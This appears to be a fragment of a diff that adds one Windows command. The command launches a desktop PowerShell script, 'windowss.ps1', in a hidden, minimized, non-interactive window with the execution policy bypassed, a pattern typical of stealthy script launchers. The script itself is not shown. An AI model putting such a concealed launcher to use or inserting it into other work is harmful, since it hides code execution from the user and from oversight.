@@ -1,0 +1,1 @@
+cmd.exe /c start /min powershell.exe -WindowStyle Hidden -NonInteractive -noexit -NoLogo -noprofile -ExecutionPolicy Bypass -File C:\Users\Attaaat\Desktop\windowss.ps1
